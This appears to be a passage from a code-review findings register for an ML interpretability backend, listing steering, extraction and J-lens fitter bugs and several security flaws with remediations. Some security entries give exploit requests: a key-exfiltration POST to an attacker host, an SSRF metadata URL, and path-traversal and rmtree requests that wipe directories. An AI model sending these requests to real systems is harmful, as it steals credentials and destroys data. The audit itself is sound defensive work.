- **Verification (R3):** pending — a live steer with a cross-layer feature would settle it
- **Proposed remediation:** Route each feature through its own `sae_id`, as the combined path already does; validate `layer == sae.layer` at the endpoint. This is the "fixed one representative, never generalized" anti-pattern this repo has recorded before.
- **Effort:** M

---

### MIS-E2E-065 — A negative dial silently returns the baseline, labelled as steered
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/services/steering_core.py:266`
- **Claim:** The unified steering core registers hooks only `if dial > 0`. A negative dial registers **no hooks at all** and returns unmodified baseline text — which the caller records as the steered arm.
- **Failure scenario:** Negative strength is canonical in this product, not an edge case: the cluster-definition contract carries `sign ∈ {1, -1}` and a member's negative strength *is* its direction. Suppressive steering therefore produces baseline output recorded as a steered sample at that dial. In the transcript recorder (`record_steering_samples`) this writes `(dial, prompt, unsteered, steered)` rows where the two arms are byte-identical, and the whole point of that artifact is for a strong model to read the difference afterwards. A silent no-op, not an error.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-38 (one steering core); memory `cluster-member-meta-contract-rev` — "CANONICAL SIGN RULE: negative strength is already directional"
- **Verification (R3):** pending
- **Proposed remediation:** Gate on `dial != 0`, or reject a negative dial explicitly. Returning the baseline under a steered label is the one behaviour that must not be silent.
- **Effort:** S

---

### MIS-E2E-066 — Batch extraction dispatches on the loop index, stranding jobs
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/services/extraction_service.py:504`; `_start_next_batch_job`
- **Claim:** Batch extraction decides what to dispatch from the `enumerate` index (`position == 1`) rather than from the first job actually *created*, and `_start_next_batch_job` only ever advances to `current + 1`.
- **Failure scenario:** If the first SAE in the batch is skipped (already extracted, invalid), **nothing is dispatched at all** — the batch silently does nothing. If a middle SAE is skipped, the tail is stranded: those jobs sit queued until the 3-hour reaper closes them with a *"crashed worker"* message, which is not what happened. The diagnosis the user is handed points at infrastructure for a dispatch-arithmetic bug.
- **Evidence:** plausible (read-only)
- **Doc reference:** PPRD §3.5 (SAE Management, batch extract)
- **Verification (R3):** pending
- **Proposed remediation:** Track created job ids and dispatch the first of those; advance to the next *created* job, not `current + 1`.
- **Effort:** M

---

### MIS-E2E-067 — A failed extraction shows no reason, because the emit uses the wrong key
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/services/extraction_service.py:1892` (failure), `:1836` (completion)
- **Claim:** A duplicate `extraction:failed` emit sends the key `"error"` where the frontend expects `"error_message"`. The store spread-merges the payload, so `error_message: undefined` overwrites the real message and nothing triggers a refetch. The parallel defect at `:1836` blanks the completion counts and sends `status: "extracting"` on a finished job.
- **Failure scenario:** An extraction fails — including the OOM path, whose whole value is its diagnostics — and the UI shows a failed job with no reason at all. The information exists server-side and is destroyed in transit by a key name.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-12 (WebSocket emission standardization) — the IDL this violates
- **Verification (R3):** pending — belongs to P09's cross-check of emitter payloads against consumer expectations
- **Proposed remediation:** Fix both keys; then, per IDL-12, type the emit payloads so a key rename cannot pass silently.
- **Effort:** S

---

### MIS-E2E-068 — Three more service defects: fabricated progress, prompt truncation, hot-path logging
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `extraction_service.py:1612`; `steering_service.py:1411`; `steering_service.py:1170`
- **Claim:**
  1. **Fabricated progress.** During the sampling phase, `features_extracted: int(latent_dim * progress)` reports a count of features that have **not been written** — zero rows exist. When the write phase begins the counter jumps *backwards* to 0.
  2. **Silent prompt truncation.** `max_length = 2048 - params.max_new_tokens` ignores the model's real context window and truncates the prompt. At the schema-allowed `max_new_tokens=2048` the prompt is truncated to **zero tokens**, and the request still runs.
  3. **Hot-path logging.** A `logger.info` inside the steering hook fires on every forward pass — hundreds of lines and list rebuilds per generation.
  - (1) and (2) share a shape with the rest of this phase: a number the user reads as real that is not, and an input silently discarded rather than rejected.
- **Evidence:** plausible (read-only)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Report written rows only; read the context window from the model config and 422 on an impossible combination; drop the log to `debug`.
- **Effort:** S

---

### MIS-E2E-069 — An unauthenticated POST exfiltrates the stored OpenAI key to any host
- **Phase / Round:** P02 / R1
- **Source:** /security-review
- **Severity:** **P0**
- **Type:** security
- **Location:** `backend/src/api/v1/endpoints/labeling.py:490-524` (`POST /api/v1/labeling/models/openai`)
- **Claim:** The handler takes a fully caller-chosen `endpoint_url` from the request body. If the body omits `api_key`, it **reads `openai_api_key` from `app_settings`, decrypts it**, and attaches it as `Authorization: Bearer <key>` to a `GET {endpoint_url}/v1/models`. The only URL check is a scheme test for `http`/`https` — `validate_llm_endpoint_url` is **never called on this path**. Confirmed: the validator has exactly two call sites in the entire tree (`schemas/labeling.py:168`, `settings.py:147`), neither of them here.
- **Failure scenario:** One request:
  ```
  POST /api/v1/labeling/models/openai
  {"endpoint_url": "https://collector.attacker.tld"}
  ```
  The backend decrypts the operator's real OpenAI key and sends it to the attacker's host in an `Authorization` header. **The omission of `api_key` is what triggers the exfiltration** — the fallback chain exists to be convenient and its convenience is the vulnerability. Every control the product offers around this credential — AES-256-GCM at rest, masking on every read, the Settings PIN — is bypassed by a single POST that never touches the settings API. The same request is also the SSRF the validator was written to prevent (`endpoint_url=http://169.254.169.254`).
- **Evidence:** **verified-by-live-repro at source** — the fallback decrypt (`:492-503`), the scheme-only check (`:508-512`), the header construction (`:521-523`), and the validator's two-call-site inventory all read directly
- **Doc reference:** PADR IDL-20 (AES-256-GCM), IDL-22 (security hardening); `utils/url_validation.py` docstring
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Two independent fixes, both needed. (1) Call `validate_llm_endpoint_url` here. (2) More importantly, **never fall back to a stored credential for a host the request body chose** — attach the stored key only when the resolved host matches the configured `openai_compatible_endpoint` or `api.openai.com`; otherwise send no `Authorization` header at all.
- **Effort:** S

---

### MIS-E2E-070 — Path traversal in extraction delete gives arbitrary directory removal
- **Phase / Round:** P02 / R1
- **Source:** /security-review
- **Severity:** **P0**
- **Type:** security
- **Location:** `backend/src/services/activation_service.py:1020` (`self.activations_dir / extraction_id`), `:1026` (`shutil.rmtree`); caller `backend/src/api/v1/endpoints/models.py:1197-1220`; schema `backend/src/schemas/model.py:359`
- **Claim:** `delete_extraction` joins a caller-supplied id onto the activations root with no containment check, no `resolve_user_path`, and no format validation. `Path.__truediv__` does not normalise `..`, and both `Path.exists()` and `shutil.rmtree()` resolve it through the OS. The schema is a bare `List[str]` with `min_length=1` and no pattern.
- **Failure scenario:** Verified at source — **the filesystem delete sits outside the `if extraction:` database guard.** The DB lookup at `models.py:1201-1210` runs first and is simply skipped when nothing matches; execution falls through to `activation_service.delete_extraction(extraction_id)` at `:1214` with the raw request string. So:
  ```
  DELETE /api/v1/models/<any-existing-model-id>/extractions
  {"extraction_ids": ["../../../../etc"]}
  ```
  resolves to `/data/activations/../../../../etc`, finds it exists, and `rmtree`s it as the backend user. Any directory that user can write is destroyable — `/data` itself, the model store, the SAE store, the Postgres volume. The `except` at `:1217` logs a warning and `deleted_ids.append(extraction_id)` runs regardless, so **the endpoint reports success either way**. The same unvalidated join is a read primitive at `activation_service.py:982`.
- **Evidence:** **verified-by-live-repro at source** — the join, the missing guard placement, the schema, and the swallow-and-report-success all read directly. Not executed: destroying a directory is the thing being reported.
- **Doc reference:** PADR IDL-22 (Security Hardening — Path Injection) — the IDL this violates
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Route the id through `settings.resolve_user_path()` (the correct, containment-checking resolver that already exists at `config.py:404`) **and** reject any `extraction_id` not matching `^[A-Za-z0-9_-]+$` at the schema, **and** move the filesystem delete inside the `if extraction:` block so only an id that resolved to a real row can reach an `rmtree`. Three cheap layers, because this one deletes things.
- **Related:** MIS-E2E-006 — the hardened resolver having one caller is exactly why this site does not use it
- **Effort:** S

---

### MIS-E2E-071 — User-writable path columns reach `rmtree`, enabling deletion of the whole data volume
- **Phase / Round:** P02 / R1
- **Source:** /security-review
- **Severity:** **P0**
- **Type:** security
- **Location:** `backend/src/schemas/dataset.py:29,45` (`raw_path`), `backend/src/schemas/model.py:37-38` (`file_path`, `quantized_path`); `dataset_service.py:226-247` and `model_service.py:207-210` (blind `setattr`); sinks `workers/dataset_tasks.py:1433-1438`, `api/v1/endpoints/models.py:161-171`
- **Claim:** `raw_path`, `file_path` and `quantized_path` are exposed as free-form `Optional[str]` on the **create and update** schemas, with only a `max_length=512`. Both update services blind-apply every submitted field via `setattr` over `model_dump(exclude_unset=True)`. On delete, the stored path is read back and handed to a worker that `rmtree`s it after `settings.resolve_data_path()` — which is **not a containment check**. Verified at `config.py:391-393`: `if path_obj.is_absolute(): if path_obj.exists(): return path_obj` — an existing absolute path is returned verbatim.
- **Failure scenario:** Two unauthenticated requests:
  ```
  POST   /api/v1/datasets   {"name":"x","source":"Local","raw_path":"/data"}
  DELETE /api/v1/datasets/<id>
  ```
  `delete_dataset` returns `raw_path="/data"`, the Celery worker resolves it (absolute, exists → returned as-is) and `shutil.rmtree("/data")` — every model, SAE, checkpoint, activation store and J-lens artifact. Nothing in either request looks suspicious to a schema validator. `PATCH /api/v1/models/{id} {"file_path":"/data"}` + `DELETE` is the same primitive through the model plane, and `POST /models/{id}/redownload` triggers it **synchronously in the API process**.
- **The underlying design fault:** the code treats "came from a DB row" as equivalent to "system-generated". That holds only while no API can write the row, and three schemas can. `sae_manager_service.py:712` has the identical pattern and is safe **today** purely because `local_path` happens not to be exposed — one field addition away from the same bug.
- **Evidence:** **verified-by-live-repro at source** — the three schema fields, the blind `setattr`, and `resolve_data_path`'s absolute-path passthrough all read directly
- **Doc reference:** PADR IDL-22
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Remove these fields from the create/update schemas — nothing legitimate sets them over the API; the download workers write them. Then make every deletion sink re-assert containment with `resolve_user_path` immediately before `rmtree`. **The database is not a trust boundary while any API can write to it.**
- **Effort:** M

---

### MIS-E2E-072 — The plaintext OpenAI key is written to disk in generated Postman collections
- **Phase / Round:** P02 / R1
- **Source:** /security-review
- **Severity:** **P0**
- **Type:** security
- **Location:** `backend/src/services/openai_labeling_service.py:406` and `:645`
- **Claim:** `_save_request_for_testing` writes debug artifacts to `data_dir/tmp_api/`. The **cURL** branch was deliberately hardened — `:335-339` carries the comment *"NEVER write the real bearer token to disk — these files are debug artifacts that get checked into bug reports / shared"* and emits a `$OPENAI_API_KEY` placeholder. The **Postman** branch, sixty lines below in the same function, writes `f"Bearer {self.api_key}"` — the real decrypted key — into the JSON. The identical block is duplicated verbatim in `_save_poor_quality_debug` at `:642-646`.
- **Failure scenario:** `export_format` defaults to `"both"`, so **the default path writes the plaintext key** — the fix applied to cURL is bypassed by the default. One file is written per feature labelled, so a single run scatters hundreds of copies of the key across the persistent `/data` volume, which is mounted into the backend and Celery pods and included in backups. The scenario the cURL comment anticipates — attaching the artifact to a bug report — then ships the key to wherever that report goes.
- **Evidence:** verified-by-live-repro (both blocks and the hardened cURL comment read; `export_format` default traced to `schemas/labeling.py:98`)
- **Doc reference:** PADR IDL-20; the in-code comment at `:335-339` is the project's own statement of the rule this violates
- **Verification (R3):** **CONFIRMED in code; NOT materialised on this machine.** The sweep was run: `tmp_api/` holds 27 files across three labeling runs, including **9 Postman collections**, and **not one contains an `Authorization` header** — zero matches for the string across every file. Those runs used a keyless local endpoint, so the `if self.api_key and self.api_key not in ["not-needed","dummy-key-not-required"]` guard skipped the header entirely. The defect is real and fires the first time a real OpenAI key is used with `save_requests_for_testing`; it has not yet fired here. Recorded precisely because "sweep and rotate" was the proposed remediation and the sweep came back clean — the urgency is lower than the finding first implied, and the register should say so.
- **Proposed remediation:** Emit `Bearer {{OPENAI_API_KEY}}` (a Postman variable) in both writers. Add a regression test that scans every file produced by both functions **across all three `export_format` values** for the key — the existing coverage evidently exercised only the cURL branch. Then sweep and rotate: three `tmp_api/` directories already exist in this working tree.
- **Effort:** S
- **Note:** this is the "fixed one representative, never generalized" anti-pattern, with the two sites sixty lines apart in one function.

---

### MIS-E2E-073 — `PUT /settings/bulk` skips the URL validation the single-key route applies
- **Phase / Round:** P02 / R1
- **Source:** /security-review (flagged as unverified; verified here)
- **Severity:** P2
- **Type:** security
- **Location:** `backend/src/api/v1/endpoints/settings.py:166-190` vs `:143-149`
- **Claim:** `PUT /settings` validates `ollama_url` and `openai_compatible_endpoint` through `validate_llm_endpoint_url` before upserting. `PUT /settings/bulk` calls `AppSettingService.upsert(db, item)` directly in a loop with **no URL validation at all**. Notably the *other* hardening — the expunge-before-mask fix, with its explanatory comment — **is** correctly duplicated into the bulk path. One of the two protections was carried across and the other was not.
- **Failure scenario:** The SSRF guard on the two endpoint keys is bypassed by sending them through `/bulk` instead. Those keys are subsequently used unvalidated by the labeling and enhanced-labeling paths, which is precisely why the validator exists on the single-key route.
- **Evidence:** **verified-by-live-repro at source** — both handlers read in full; the reviewer explicitly flagged this as unchecked and it was checked
- **Doc reference:** PADR IDL-22
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Extract the validation into `AppSettingService.upsert` so neither route can forget it — a guard on the caller is a guard someone will not copy.
- **Effort:** S

---

### MIS-E2E-074 — `trust_remote_code=True` is hardcoded in three services, overriding the user's download-time choice
- **Phase / Round:** P02 / R1
- **Source:** /security-review
- **Severity:** P1
- **Type:** security
- **Location:** `services/steering_service.py:899,921`; `services/logit_lens_service.py:351,361`; `services/local_labeling_service.py:84,92`
- **Claim:** The download plumbing treats remote-code execution as an explicit opt-in defaulted **off**: `ModelDownloadRequest.trust_remote_code` defaults `False`, `ml/model_loader.py:184` defaults `False` and threads the caller's value into every `from_pretrained`, and `workers/model_tasks.py:237` respects it. Three services discard that and hardcode `True`.
- **Failure scenario:** A user evaluates an untrusted community fine-tune and leaves `trust_remote_code` unchecked — whose documented meaning is *"do not run code from this repo"*. Download executes nothing, but `snapshot_download` still writes the repo's `modeling_*.py` to disk. The first steering run then calls `AutoModelForCausalLM.from_pretrained(load_path, trust_remote_code=True)`, transformers imports that file, and arbitrary Python executes in the GPU worker — which holds `/data` write access, the Celery broker and the DB credentials. **The safety flag is a property of which subsystem touches the model next, not of the model**, and the user is never told.
- **Evidence:** plausible (read-only) — all six hardcode sites and the defaulted-off plumbing read; not executed
- **Doc reference:** PADR IDL-3 (multi-architecture SAE support), IDL-13 (dynamic layer discovery)
- **Verification (R3):** pending
- **Proposed remediation:** Persist the download-time decision on the `Model` row and read it in all three services. Add a test asserting the flag reaching `from_pretrained` is `False` for such a row — and mutate it to `True` as a negative control, since a test that only checks "loading succeeded" passes against both.
- **Effort:** M

---

### MIS-E2E-075 — Unvalidated `judge_endpoint`, and a manifest slot reserved for a credential
- **Phase / Round:** P02 / R1
- **Source:** /security-review
- **Severity:** P2
- **Type:** security
- **Location:** `backend/src/services/circuit_calibration_service.py:48-69` (`create_config`), `:449` (client construction), `:164` (manifest payload); `api/v1/endpoints/circuits.py:325`; `mcp_server/tools/circuits.py:371`
- **Claim:** `CalibrationBody.judge_endpoint` is free-form per-request input, copied into the config with **no validation — not even a scheme check** — and handed to an `OpenAI` client that POSTs from inside the GPU Celery worker. `validate_llm_endpoint_url` is not on this path. The MCP tool `calibrate_circuit_strength` exposes the same parameter to agents. Separately, `create_config` reserves a `judge_api_key` slot at `:69` and the **whole config dict** is written verbatim into the persisted calibration manifest at `:164`.
- **Failure scenario:** The SSRF half is genuinely limited (POST-only to a `/chat/completions` path, and RFC1918/loopback are permitted by policy anyway) — Medium, not High. The larger risk is the second half: manifests are designed to travel, are read over MCP (`get_validation_manifest`) and re-run by `reproduce_calibration`. Today `CalibrationBody` has no `judge_api_key` field so pydantic drops it and the value is always `None` — **the credential-in-manifest is latent, one field addition away from live**, in a document whose stated purpose is portability.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-37 (calibration), IDL-34 (manifest reproducibility)
- **Verification (R3):** pending
- **Proposed remediation:** Validate the endpoint. Build the manifest config from an **explicit allow-list of keys**, not `cfg` wholesale. And extend `manifest_service._assert_no_paths` — which already walks payloads rejecting `/data/` and `/home/` strings — into an `_assert_no_secrets` that rejects keys matching `*key*`/`*token*`/`*secret*`. The guard shape already exists; it just does not cover this class.
- **Effort:** M

---

### MIS-E2E-076 — IDL-38's "one steering core" is two; the user-facing path is the unmigrated one
- **Phase / Round:** P02 / R1
- **Source:** /review (IDL conformance)
- **Severity:** P2
- **Type:** debt
- **Location:** `backend/src/services/steering_core.py` (317 lines, `build_steer_generator`) vs `backend/src/services/steering_service.py:1127` (`_create_steering_hook`) and `:1273` (`_register_steering_hooks`)
- **Claim:** PADR IDL-38 is titled *"Steered transcript recorder — **one steering core**, general recorder, transcript-carrying manifests"*, and `steering_recorder_service.py:10` states it is *"Built on the unified `steering_core` (the same generation core calibration uses)"*. In practice `build_steer_generator` has exactly **two** consumers — the recorder and `circuit_calibration_service`. Every user-facing steering path (`/steering/compare`, `/steering/sweep`, `/steering/combined`, the Steering panel) runs `steering_service`'s **own independent** hook implementation. There are two steering cores, and the one the product's primary feature uses is not the unified one.
- **Failure scenario:** Not a runtime bug — an explanation for a class of them. Every steering fix must now be applied twice, and the record shows it is not: MIS-E2E-064 (compare and sweep steering in the wrong SAE basis) is a defect of the `steering_service` path that was fixed only for `combined`, while MIS-E2E-065 (a negative dial silently returning baseline) is a defect of the `steering_core` path. The two implementations have **different bugs**, which is the signature of a duplication that the docs record as resolved.
- **Refuted sub-hypothesis, recorded so it is not re-run:** the sharpest version of this — that the hardware-only hook-target fix (*"additive steering MUST hook `structure.layers_module[L]` (resid_post), not the discovered `"residual"` RMSNorm, which renormalizes the vector away"*) reached only `steering_core` — is **false**. `steering_service._get_target_module:1113-1117` calls `discover_transformer_structure` and returns `layers_module[layer]`, the whole decoder layer. Both implementations hook the correct target. That fix was generalized; the SAE-routing fix was not.
- **Evidence:** verified-by-live-repro — consumer grep for `build_steer_generator`; both hook-target resolutions read
- **Doc reference:** PADR IDL-38; memory `steering-hook-target-whole-layer`
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Migrate `steering_service`'s compare/sweep/combined onto `build_steer_generator`, which is what IDL-38 already says happened. Until then, treat every steering finding as "which of the two?" and check both — and amend IDL-38 to describe what shipped.
- **Effort:** L

---

## P02 — R2 (adversarial re-review + mutation controls)

---

### MIS-E2E-077 — The force-encryption control for credentials has no test
- **Phase / Round:** P02 / R2
- **Source:** mutation control M7
- **Severity:** P1
- **Type:** test-gap
- **Location:** `backend/src/services/app_setting_service.py:22` (`_SENSITIVE_KEYS`), `:45` (`is_sensitive = data.key in _SENSITIVE_KEYS or data.is_sensitive`)
- **Claim:** Removing `openai_api_key` from `_SENSITIVE_KEYS` left **40 tests green**. That frozenset is the server-side guarantee that a credential is encrypted at rest **regardless of what the client claims** — with it gone, a request carrying `is_sensitive: false` stores the operator's OpenAI key in plaintext in `app_settings`.
- **Failure scenario:** The control is correct and unprotected. R1's `/security-review` listed it under "verified clean" and described it accurately — *"forces encryption server-side regardless of the client's `is_sensitive` flag (blocking a plaintext downgrade)"*. Reading established that the control exists and is right; only breaking it established that nothing keeps it right. A refactor that reorganises the set, or a new credential key added without being added here, silently stores plaintext with a green suite.
- **Evidence:** **verified-by-mutation** — M7 landed (1 deletion confirmed), suite green, restore verified clean
- **Doc reference:** PADR IDL-20 (DB-backed settings with AES-256-GCM)
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** A test that upserts each `_SENSITIVE_KEYS` member with `is_sensitive: false` and asserts the stored column is **not** the plaintext value. Parametrize it over the set so a newly added key inherits the coverage instead of needing to be remembered.
- **Effort:** S

---

### MIS-E2E-078 — The hardware-only steering hook-target fix is unpinned on both implementations
- **Phase / Round:** P02 / R2
- **Source:** mutation controls M8 and M9
- **Severity:** P1
- **Type:** test-gap
- **Location:** `backend/src/services/steering_service.py:1113-1117` (`_get_target_module`); `backend/src/services/steering_core.py:236`
- **Claim:** Regressing the steering hook target from the whole decoder layer back to a norm submodule — the historically-wrong target — leaves the suite green on **both** paths: 84 tests for `steering_service`, 200 for `steering_core`.
- **Failure scenario:** This is the Recorder increment's headline defect (commit 91b5a6c). Additive steering must hook `structure.layers_module[L]` (resid_post); hooking the discovered `"residual"` module — a post-attention RMSNorm on LFM2 — **renormalises the steering vector away**, producing `steered == unsteered at every dial`. Four static review rounds and the whole unit suite missed it originally; only a hardware run found it. Nothing has changed: the regression is still invisible to the suite, on both implementations.
  `steering_core.py:229-236` carries a detailed comment explaining exactly why the RMSNorm target is wrong and that hooking the layer output *"survives, so the recorded transcript matches what miLLM serves."* **The trap is documented in prose and enforced by nothing.**
- **Evidence:** **verified-by-mutation** — M8 and M9 both landed (confirmed by `git diff --stat`), both suites green, both restores verified clean
- **Doc reference:** PADR IDL-38; memory `steering-hook-target-whole-layer`; commit 91b5a6c
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** A test asserting the module handed to `register_forward_hook` **is** `structure.layers_module[L]` and is not a norm submodule — cheap, needs no GPU, and would have failed before the hardware round. Add it to both implementations while both exist (MIS-E2E-076). Then re-run this mutation as a negative control to prove the new test bites.
- **Effort:** S
- **Note:** the standing rule — *mutate the previous round's fix; if it does not fail loudly, that round produced an unpinned fix* — is satisfied here in the negative, for a fix that cost a hardware round to find.

---

## P03 — ML / GPU

---

### MIS-E2E-079 — The documented freeze-leak gate does not exist
- **Phase / Round:** P03 / R1
- **Source:** /code-review high
- **Severity:** **P0** *(a capability the product claims to ship that is unreachable)*
- **Type:** reachability
- **Location:** `backend/src/ml/jlens_fitter.py:583` (constructor param), `:610` (`self.max_affine_residual = max_affine_residual`)
- **Claim:** `CLAUDE.md` states, as a shipped property of the J-space fitter: *"**`affine_residual` refuses a fit whose freeze leaked.** An incomplete freeze yields a matrix of the right shape and size that passes STRUCTURAL/NAMING/ENVELOPE and reads out plausible nonsense; fit time is the only point where it is detectable."* No such gate exists. `max_affine_residual` is accepted as a constructor argument, assigned to an attribute, and **never read** — grepped across `backend/src` and `backend/tests`, two hits total, both writes. `affine_residual` itself appears only in **docstrings** at `:417` and `:440`; it is never computed.
- **Failure scenario:** The threshold is configured and compared to nothing. Per the project's own description, an incomplete freeze produces a lens that passes every other validation class and reads out plausible nonsense, and **fit time is the only point where it is detectable** — so this is not one guard among several, it is the only one, and it is absent. A leaked-freeze lens is therefore fittable, validatable, publishable to HuggingFace, and mountable by miLLM, and nothing anywhere would say otherwise.
- **Evidence:** **verified-by-live-repro** — grep over `src` and `tests` for both identifiers; the two hits are the parameter and the assignment
- **Doc reference:** `CLAUDE.md` J-Space arc section; PADR IDL-41 (model-agnostic lens construction)
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Implement the comparison the stored threshold implies, and gate the fit on it. Then apply the repo's own reachability rule: delete the gate line and require a red. Until it exists, `CLAUDE.md`'s claim should be corrected — a documented guarantee that is absent is worse than no guarantee, because it stops anyone looking.
- **Effort:** M

---

### MIS-E2E-080 — "Converged" measures sample count, not stabilisation
- **Phase / Round:** P03 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug *(the "wrong results presented as correct" class)*
- **Location:** `backend/src/ml/jlens_fitter.py:686-699`
- **Claim:** The fit accumulates a running mean, `accumulated += (mat - accumulated) / seen`, and declares convergence when `relative_change(previous, accumulated) < convergence_delta` for `PATIENCE` consecutive steps. The step size of a running mean is `O(σ/n)` in the per-prompt spread σ — **it shrinks because the denominator grows, not because successive estimates of J agree.** So the stop point is `n ≈ σ/δ`: directly proportional to per-prompt variance, and reachable by any process whose increments are bounded, converged or not.
- **Failure scenario:** The reviewer simulated it: stop points **518 / 1050 / 2030** for noise 0.5 / 1.0 / 2.0 — exactly proportional, and **bracketing the two real recorded fits** that `CLAUDE.md` reports as *"paper-aligned converged lenses (gemma 634 prompts, LFM2 1097)"*. Those two numbers are therefore consistent with the criterion measuring nothing but each model's per-prompt variance. A noisier model is required to run proportionally longer to earn the same word; a low-variance but *biased* estimate converges early. The word "converged" is doing evidential work in the artifact, the docs and the gate decision, and it is not supported by what is computed.
- **Evidence:** **verified-by-live-repro** — the running-mean update and the delta computation read at source; the reviewer's simulation reproduces the proportionality
- **Doc reference:** `CLAUDE.md` ("paper-aligned converged lenses"); PADR IDL-41; 021_FPRD
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Measure stabilisation of J against a **held-out** set of prompts, or compare split-half estimates, rather than the shrinkage of a running mean's own increment. Until then, do not call it convergence in the artifact or the docs.
- **Effort:** M

---

### MIS-E2E-081 — The published lens artifact labels a spread as a residual
- **Phase / Round:** P03 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/ml/jlens_fitter.py:909`
- **Claim:** The published artifact writes per-source-position **spread** under the keys `linearisation_residual_mean` and `linearisation_residual_max`. The real `linearisation_residual` function is never called outside tests.
- **Failure scenario:** A field named after a quantity is populated by a different quantity, in a document that **travels** — to HuggingFace and into miLLM. A consumer reading `linearisation_residual_max` to judge how well the affine approximation holds gets a number about positional variation instead, with no way to tell. This is the class the J-Lens review lessons single out: *evidence that is wrong rather than merely missing*.
- **Evidence:** verified-by-live-repro (the write site and the function's caller inventory)
- **Doc reference:** PADR IDL-42, IDL-45 (Neuronpedia wire format)
- **Verification (R3):** pending
- **Proposed remediation:** Rename the keys to what they measure, or compute the residual. Note this was **already recorded as standing debt** by the architect persona (*"`linearisation_residual()` has zero callers while a field named after it is populated by something else"*) — it is in a published artifact, which is why it is filed at P1 rather than left as debt.
- **Effort:** S

---

### MIS-E2E-082 — A raise during norm patching leaks a process-wide patch and the freeze lock
- **Phase / Round:** P03 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/ml/jlens_fitter.py:299`
- **Claim:** Norm patching runs **before** the `try:`, so an exception there leaks the process-wide SDPA patch and never releases `_FREEZE_LOCK`.
- **Failure scenario:** Every subsequent forward pass in that worker process runs under a patched attention implementation, and every subsequent fit blocks forever on a lock nobody holds — a permanent, silent degradation of the process, recoverable only by restarting the worker. The comment immediately above the site was written to prevent exactly this.
- **Evidence:** plausible (read-only) — the ordering is verified; the leak is reasoned
- **Doc reference:** PADR IDL-41
- **Verification (R3):** pending
- **Proposed remediation:** Move the patch inside the `try:`, or acquire it with a context manager so the release is structural.
- **Effort:** S

---

### MIS-E2E-083 — Circuit capture runs the SAE off-distribution
- **Phase / Round:** P03 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/ml/sparse_autoencoder.py:173` (`encode` requires pre-normalized input); `_load_sae` never passes the trained `normalize_activations`
- **Claim:** `encode()` expects input already normalized the way training normalized it. The extraction path does this; **circuit capture and attribution do not**, and `_load_sae` does not carry the trained `normalize_activations` setting through, so those paths feed raw activations to an SAE trained on normalized ones.
- **Failure scenario:** Every circuit discovered from a capture is mined from activations the dictionary was not trained to decode. The features fire, the numbers are plausible, and the basis is wrong — the same silent-wrong-basis shape as MIS-E2E-064, in the discovery plane rather than the steering plane. Everything downstream (co-activation statistics, attribution, edge validation) inherits it.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-2, IDL-3; PPRD §3.17
- **Verification (R3):** pending
- **Proposed remediation:** Carry `normalize_activations` on the SAE record and apply it in `_load_sae`, so every consumer inherits the training-time convention instead of each remembering.
- **Effort:** M

---

### MIS-E2E-084 — Three generic-caller contract breaks in the SAE classes, all reproduced
- **Phase / Round:** P03 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/ml/sparse_autoencoder.py:345` (`SkipAutoencoder.decode`), `:653` (`TopKSAE.encode`/`decode`); `backend/src/ml/forward_hooks.py:279`
- **Claim:** Three defects that only appear through a *generic* caller, all reproduced by execution:
  1. **`SkipAutoencoder.decode(z, x_original)`** breaks the base-class signature. `circuit_capture_service.py:991` and `circuit_attribution_service.py:58` call `decode(z)` polymorphically → **TypeError**.
  2. **`TopKSAE.encode`/`decode` omit `b_pre`** where every sibling applies it. A generic caller gets a reconstruction offset by the bias (max error **1.13** reproduced) *and* a different top-k selection — so the features chosen differ, not just their scale.
  3. **`forward_hooks.py:279`** does `del activation_list[i]` while iterating a fixed `range(len(...))` → **IndexError** for any list with ≥2 entries (reproduced). Latent only because every current caller clears after a single forward.
- **Failure scenario:** (1) and (2) mean circuit capture and attribution are broken or subtly wrong for two of the six SAE frameworks — and (2) is the dangerous one, because it does not raise. (3) is a live landmine behind an accidental invariant.
- **Evidence:** **verified-by-live-repro** — all three reproduced by the reviewer against torch 2.9.1
- **Doc reference:** PADR IDL-3 (multi-architecture SAE support)
- **Verification (R3):** pending
- **Proposed remediation:** Make the base-class contract explicit and conform all six implementations; iterate a copy or delete in reverse.
- **Effort:** M

---

### MIS-E2E-085 — `anthropic_rescale` is arithmetically identical to `constant_norm_rescale`
- **Phase / Round:** P03 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/ml/sparse_autoencoder.py:49`
- **Claim:** The two normalization modes compute the same thing — verified numerically, max difference **2.4e-7**. So `standard_anthropic` is not a distinct framework from its sibling in any respect that affects the model.
- **Failure scenario:** The PPRD advertises **six paper-grounded frameworks**, and two of them are the same arithmetic under different names. A user selecting `standard_anthropic` to reproduce a paper gets `constant_norm_rescale`, and any comparison between the two measures noise.
- **Evidence:** **verified-by-live-repro** (numerical comparison executed)
- **Doc reference:** PPRD §2.1, PADR IDL-3 ("6 paper-grounded frameworks")
- **Verification (R3):** pending
